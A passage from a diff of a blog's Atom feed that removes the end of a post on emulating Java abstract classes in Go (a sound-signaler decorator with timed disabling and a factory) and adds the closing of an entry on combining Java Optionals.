-	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enabled&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;//start playing sound&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;soundSignaler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Disable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enabled&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;false&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;//stop playing sound&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;soundSignaler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IsEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enabled&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;OK, now let’s do the implementation of the temporal execution of the signaler. In order to do so, let’s create a new type that implement &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Signaler&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-golang highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temporalSignaler&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AlarmConfig&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;timers&lt;/span&gt;          &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signalerTimer&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;delayedExecutor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;delayedExecutor&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;signaler&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;Signaler&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temporalSignaler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Enable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signaler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Enable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delayedExecutor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;executeAfterSeconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SecondsStopSignals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Disable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temporalSignaler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Disable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Stop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signaler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Disable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temporalSignaler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IsEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signaler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;The key point of this struct, is that we’re holding a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Signaler&lt;/code&gt; instance on it. We are “decorating” that instance with the temporal disabling functionality. In order to do so, we just need to implement the logic in the type and call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Signaler&lt;/code&gt; methods of the decorated instance.&lt;/p&gt;
-
-&lt;p&gt;The most elegant part of this implementation is that we’re defining all the structs as private (name begins with lower case). So, the external modules cannot instantiate them. We can abstract the creation of the sound signaler by creating a factory:&lt;/p&gt;
-
-&lt;div class=&quot;language-golang highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NewSoundSignaler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Signaler&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temporalSignaler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;delayedExecutor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;defaultDelayedExecutor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Alarm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;signaler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;soundSignaler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;executor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unixCommandExecutor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;
-		&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;External modules can call the factory method, and they will receive a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Signaler&lt;/code&gt; instance, hiding effectively the implementation details of the temporal execution and sound playback.&lt;/p&gt;</content><author><name></name></author><category term="golang" /><category term="design-patterns" /><category term="architecture" /><category term="golang" /><category term="design-patterns" /><category term="architecture" /><summary type="html">I’m doing a side project using golang, and I have a use case where I’d use an abstract class in Java. Unfortunately, in golang the concept of classes does not exist. In this article I describe how can I implement the behaviour I want without abstract class.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/golang-abstract/featured-image.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/golang-abstract/featured-image.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="java9" /><category term="optional" /><category term="java9" /><category term="optional" /><summary type="html">I was implementing a searching algorithm and I had to search for two things. In this article I describe how I implemented combining two Java optionals.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/combine-optional/featured-image.jpeg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/combine-optional/featured-image.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
